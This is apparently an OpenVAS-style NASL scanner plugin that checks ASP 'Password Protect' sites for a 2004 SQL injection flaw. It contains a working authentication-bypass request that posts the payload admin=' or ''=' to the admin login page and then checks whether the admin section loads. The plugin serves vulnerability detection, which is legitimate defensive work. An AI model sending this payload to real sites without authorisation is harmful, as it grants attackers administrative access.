if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14587" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2004-1647", "CVE-2004-1648" );
	script_bugtraq_id( 11073 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Password Protect SQL Injection" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade to the latest version of this software." );
	script_tag( name: "summary", value: "Password Protect is a password protected script allowing you to manage a
  remote site through an ASP based interface." );
	script_tag( name: "impact", value: "An SQL Injection vulnerability in the product allows remote attackers to
  inject arbitrary SQL statements into the remote database and to gain
  administrative access on this service." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/adminSection/main.asp";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	v = eregmatch( pattern: "Set-Cookie: *([^; \\t\\r\\n]+)", string: res );
	if(isnull( v )){
		continue;
	}
	cookie = v[1];
	useragent = http_get_user_agent();
	req = NASLString( "POST /", dir, "/adminSection/index_next.asp HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: */*\\r\\n", "Connection: close\\r\\n", "Cookie: ", cookie, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 57\\r\\n", "\\r\\n", "admin=%27+or+%27%27%3D%27&Pass=password&BTNSUBMIT=+Login+\\r\\n" );
	res = http_keepalive_send_recv( port: port, data: req );
	req = NASLString( "GET /", dir, "/adminSection/main.asp HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: */*\\r\\n", "Connection: close\\r\\n", "Cookie: ", cookie, "\\r\\n", "\\r\\n" );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "Web Site Administration" ) && ContainsString( res, "The Web Animations Administration Section" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

